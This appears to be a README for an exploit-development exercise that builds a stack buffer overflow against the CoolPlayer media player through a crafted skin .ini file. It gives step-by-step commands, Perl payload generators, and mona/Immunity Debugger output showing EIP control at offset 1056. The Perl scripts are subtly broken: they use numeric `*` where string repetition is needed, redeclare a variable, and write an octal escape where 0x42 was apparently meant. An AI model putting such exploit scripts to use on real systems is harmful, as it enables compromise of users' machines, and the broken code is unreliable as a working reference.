# Exploit Dev

## How To

1) Run ```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```
2) Add the string to *pattern.pl*
3) Run ```perl pattern.pl```
4) Add *mona.py* to ```C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands```
5) Load Immunity Debugger
6) Add *Cool Player* to Immunity Debugger
7) Attach *pattern.ini* to *Cool Player*
8) In Immunity Debugger run ```!mona findmsp```
9) Run ```perl postCrash.pl```

## Code

### Pattern Genration

*note: navigate to ```C:\cmd``` in cmd line*

```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```

### Perl

#### pattern.pl

```perl
my $file="pattern.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
    # pattern from pattern generation
my $pattern = "";

open($FILE,">$file");
print $FILE $header.$pattern;
close($FILE);
```

### postCrash.pl

```perl
my $file="postCrash.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
				# we know the offset is at 1056
my $pattern = "\x41" * 1056;
my $pattern .= "\42" * 4;

open($FILE,">$file");
print $FILE $header.$pattern;
close($FILE);
```

### Mona

```!mona findmsp```

#### Results

```text
[+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x001257d0 (length 212 bytes)
    Cyclic pattern (normal) found at 0x00137341 (length 2500 bytes)
    -  Stack pivot between 71501 & 74001 bytes needed to land in this pattern
    EIP contains normal pattern : 0x42326a42 (offset 1056)
    ESP (0x00125bf4) points at offset 1060 in normal pattern (length 1440)
    EBP contains normal pattern : 0x316a4230 (offset 1052)
    ESI (0x00125bfc) points at offset 1068 in normal pattern (length 1432)
```

### CoolPlayer Skin

```text
[CoolPlayer Skin]

PlaylistSkin=
```
